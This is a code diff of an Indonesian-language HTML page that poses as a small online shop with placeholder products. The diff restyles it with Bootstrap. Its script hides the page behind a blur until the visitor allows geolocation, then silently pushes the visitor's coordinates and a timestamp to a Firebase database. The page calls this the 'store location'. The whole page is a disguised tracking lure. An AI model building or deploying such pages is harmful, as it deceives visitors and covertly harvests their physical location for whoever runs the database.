@@ -1,110 +1,121 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>🛒 Toko Belanja Sederhana</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>🛒 Toko Modern dengan Bootstrap</title>
+
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      max-width: 600px;
-      margin: auto;
-      padding: 1rem;
-      background: #f5f5f5;
-      color: #333;
-      transition: filter 0.3s ease;
-    }
-    /* Filter buram dan abu-abu */
     body.blur {
-      filter: grayscale(100%) blur(3px);
+      filter: grayscale(100%) blur(4px);
       pointer-events: none;
       user-select: none;
+      transition: filter 0.3s ease;
     }
-    header {
-      text-align: center;
-      margin-bottom: 2rem;
-    }
-    header h1 {
-      margin: 0;
-      color: #2c3e50;
-    }
-    .store-location {
-      margin: 1rem 0;
-      text-align: center;
-    }
-    .store-location img {
-      width: 150px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.15);
-    }
-    .products {
-      display: grid;
-      grid-template-columns: repeat(auto-fit,minmax(150px,1fr));
-      gap: 1rem;
-    }
-    .product-card {
-      background: white;
-      padding: 1rem;
-      border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .product-card img {
-      max-width: 100%;
-      height: 100px;
-      object-fit: contain;
-      margin-bottom: 0.5rem;
-    }
-    /* Pesan overlay saat belum izinkan lokasi */
     #permission-message {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(255, 255, 255, 0.9);
-      color: #e74c3c;
-      font-size: 1.2rem;
+      background: rgba(255, 255, 255, 0.95);
+      color: #dc3545;
+      font-size: 1.3rem;
       display: flex;
       justify-content: center;
       align-items: center;
       text-align: center;
       padding: 2rem;
-      z-index: 9999;
-      display: none; /* default disembunyikan */
+      z-index: 1080;
+      display: none;
+      flex-direction: column;
+    }
+    #permission-message svg {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 1rem;
     }
   </style>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 </head>
 <body class="blur">
-  <header>
-    <h1>🛒 Toko Keren</h1>
-    <p>Belanja mudah dan cepat</p>
-  </header>
 
-  <div class="store-location">
-    <img src="https://cdn-icons-png.flaticon.com/512/684/684908.png" alt="Icon Toko" />
-    <p>Lokasi toko tersimpan otomatis</p>
+  <!-- Navbar -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-primary shadow">
+    <div class="container">
+      <a class="navbar-brand fw-bold" href="#">
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-shop" viewBox="0 0 16 16">
+          <path d="M2.97 1a1 1 0 0 0-.97 1v1h12V2a1 1 0 0 0-.97-1H2.97zm-.97 3v9.5a1 1 0 0 0 1 1H12a1 1 0 0 0 1-1V4H2z"/>
+          <path d="M12 6v7H4V6h8z"/>
+        </svg>
+        Toko Modern
+      </a>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="container py-5">
+
+    <header class="text-center mb-5">
+      <h1 class="display-5 fw-semibold">Belanja Mudah dan Cepat</h1>
+      <p class="text-muted fs-5">Lokasi toko akan tersimpan otomatis untuk kenyamanan Anda</p>
+    </header>
+
+    <!-- Store Icon -->
+    <section class="text-center mb-5">
+      <img
+        src="https://cdn-icons-png.flaticon.com/512/684/684908.png"
+        alt="Icon Toko"
+        class="img-fluid rounded shadow"
+        style="max-width: 180px;"
+      />
+    </section>
+
+    <!-- Produk Grid -->
+    <section>
+      <div class="row row-cols-1 row-cols-sm-2 row-cols-md-3 g-4">
+        <article class="col">
+          <div class="card h-100 shadow-sm">
+            <img src="https://via.placeholder.com/300x180?text=Produk+1" class="card-img-top" alt="Produk 1" />
+            <div class="card-body text-center">
+              <h5 class="card-title">Produk 1</h5>
+              <p class="card-text text-primary fw-semibold">Rp 50.000</p>
+            </div>
+          </div>
+        </article>
+        <article class="col">
+          <div class="card h-100 shadow-sm">
+            <img src="https://via.placeholder.com/300x180?text=Produk+2" class="card-img-top" alt="Produk 2" />
+            <div class="card-body text-center">
+              <h5 class="card-title">Produk 2</h5>
+              <p class="card-text text-primary fw-semibold">Rp 75.000</p>
+            </div>
+          </div>
+        </article>
+        <article class="col">
+          <div class="card h-100 shadow-sm">
+            <img src="https://via.placeholder.com/300x180?text=Produk+3" class="card-img-top" alt="Produk 3" />
+            <div class="card-body text-center">
+              <h5 class="card-title">Produk 3</h5>
+              <p class="card-text text-primary fw-semibold">Rp 100.000</p>
+            </div>
+          </div>
+        </article>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Permission Overlay -->
+  <div id="permission-message" role="alert" aria-live="assertive">
+    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-exclamation-triangle-fill" viewBox="0 0 16 16">
+      <path d="M8.982 1.566a1.13 1.13 0 0 0-1.964 0L.165 13.233c-.457.778.091 1.767.982 1.767h13.706c.89 0 1.438-.99.982-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"/>
+    </svg>
+    <div>⚠️ Untuk melihat toko, mohon izinkan akses lokasi di browser Anda.<br/>Jika sudah muncul popup izin, silakan pilih “Izinkan”.</div>
   </div>
 
-  <div class="products">
-    <div class="product-card">
-      <img src="https://via.placeholder.com/150x100?text=Produk+1" alt="Produk 1" />
-      <h3>Produk 1</h3>
-      <p>Rp 50.000</p>
-    </div>
-    <div class="product-card">
-      <img src="https://via.placeholder.com/150x100?text=Produk+2" alt="Produk 2" />
-      <h3>Produk 2</h3>
-      <p>Rp 75.000</p>
-    </div>
-    <div class="product-card">
-      <img src="https://via.placeholder.com/150x100?text=Produk+3" alt="Produk 3" />
-      <h3>Produk 3</h3>
-      <p>Rp 100.000</p>
-    </div>
-  </div>
-
-  <div id="permission-message">
-    ⚠️ Untuk melihat toko, mohon izinkan akses lokasi di browser Anda.<br>
-    Jika sudah muncul popup izin, silakan pilih “Izinkan”.
-  </div>
+  <!-- Firebase JS SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
   <script>
     const firebaseConfig = {
@@ -122,7 +133,6 @@
     const permissionMessageEl = document.getElementById('permission-message');
     const bodyEl = document.body;
 
-    // Fungsi kirim lokasi ke Firebase tanpa notifikasi UI
     function sendLocation(lat, lon) {
       const now = new Date().toISOString();
       db.ref("lokasi").push({
@@ -133,59 +143,49 @@
     }
 
     function checkPermissionAndRequest() {
-      // Cek status permission geolocation
       if (!navigator.geolocation) {
-        permissionMessageEl.innerText = "Browser Anda tidak mendukung Geolocation.";
+        permissionMessageEl.textContent = "Browser Anda tidak mendukung Geolocation.";
         permissionMessageEl.style.display = "flex";
         return;
       }
 
-      // Cek permission API
       if (navigator.permissions) {
         navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
           if (permissionStatus.state === 'granted') {
-            // izin sudah diberikan, ambil lokasi dan tampilkan halaman normal
             bodyEl.classList.remove('blur');
             permissionMessageEl.style.display = "none";
             navigator.geolocation.getCurrentPosition(pos => {
               sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
             });
           } else if (permissionStatus.state === 'prompt') {
-            // belum dipilih, tampilkan pesan dan coba minta izin
             permissionMessageEl.style.display = "flex";
             navigator.geolocation.getCurrentPosition(pos => {
-              // user baru saja memberi izin
               bodyEl.classList.remove('blur');
               permissionMessageEl.style.display = "none";
               sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
             }, err => {
-              // user tolak izin
-              permissionMessageEl.innerText = "⚠️ Anda menolak izin lokasi. Untuk melihat toko, mohon izinkan akses lokasi.";
+              permissionMessageEl.innerHTML = "⚠️ Anda menolak izin lokasi. Mohon izinkan untuk melihat toko.";
               permissionMessageEl.style.display = "flex";
               bodyEl.classList.add('blur');
             });
           } else if (permissionStatus.state === 'denied') {
-            // user tolak izin
-            permissionMessageEl.innerText = "⚠️ Anda telah menolak izin lokasi. Untuk melihat toko, mohon izinkan akses lokasi dari pengaturan browser.";
+            permissionMessageEl.innerHTML = "⚠️ Anda telah menolak izin lokasi. Mohon izinkan akses lokasi dari pengaturan browser.";
             permissionMessageEl.style.display = "flex";
             bodyEl.classList.add('blur');
           }
-          
-          // Monitor jika permission berubah di waktu berjalan
+
           permissionStatus.onchange = function() {
             checkPermissionAndRequest();
           };
         });
       } else {
-        // Fallback jika browser tidak support Permissions API
-        // Coba langsung minta lokasi
         navigator.geolocation.getCurrentPosition(pos => {
           bodyEl.classList.remove('blur');
           permissionMessageEl.style.display = "none";
           sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
         }, err => {
           permissionMessageEl.style.display = "flex";
-          permissionMessageEl.innerText = "⚠️ Mohon izinkan akses lokasi untuk melihat toko.";
+          permissionMessageEl.textContent = "⚠️ Mohon izinkan akses lokasi untuk melihat toko.";
           bodyEl.classList.add('blur');
         });
       }
@@ -193,5 +193,8 @@
 
     checkPermissionAndRequest();
   </script>
+
+  <!-- Bootstrap Bundle JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
